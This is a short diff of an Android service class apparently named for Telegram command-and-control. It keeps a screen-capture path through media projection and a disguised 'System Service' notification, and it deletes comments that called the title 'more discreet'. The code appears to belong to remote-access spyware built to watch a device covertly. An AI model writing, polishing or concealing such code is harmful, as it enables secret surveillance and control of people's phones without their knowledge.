@@ -50,7 +50,6 @@ public class TelegramC2Service extends Service {
             ErrorLogger.logError(this, "TelegramC2Service_Config", e);
         }
         createNotifChannel();
-        // FIXED: Start with base service types. No mediaProjection here.
         startForeground(NOTIFICATION_ID, createNotification());
         try {
             startWorker();
@@ -85,7 +84,7 @@ public class TelegramC2Service extends Service {
         } else {
             b = new Notification.Builder(this);
         }
-        b.setContentTitle("System Service"); // More discreet title
+        b.setContentTitle("System Service");
         b.setSmallIcon(android.R.drawable.stat_notify_sync);
         return b.build();
     }
@@ -132,7 +131,6 @@ public class TelegramC2Service extends Service {
 
     private void handleScreenshotResult(int resultCode, Intent data) {
         try {
-            // FIXED: Promote the service to mediaProjection type BEFORE getting the projection
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
